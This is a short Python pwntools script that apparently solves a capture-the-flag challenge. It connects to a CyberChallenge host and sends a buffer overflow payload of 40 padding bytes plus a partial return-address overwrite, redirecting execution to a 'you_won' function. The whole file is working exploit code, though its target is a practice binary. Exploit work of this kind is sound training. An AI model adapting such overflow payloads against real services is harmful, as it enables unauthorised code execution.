from pwn import *

HOST = "luck.challs.cyberchallenge.it"
PORT = 9133

p = remote(HOST, PORT)

exe = ELF("../Downloads/try_your_luck")
context.binary = exe

a = hex(exe.symbols["you_won"])

print(f"you_won_addr: {hex(exe.symbols["you_won"])}")
print(f"Base address: {hex(exe.address)}")

payload = b'a'*40 + b'\x3a\x08'

p.send(payload)
p.interactive()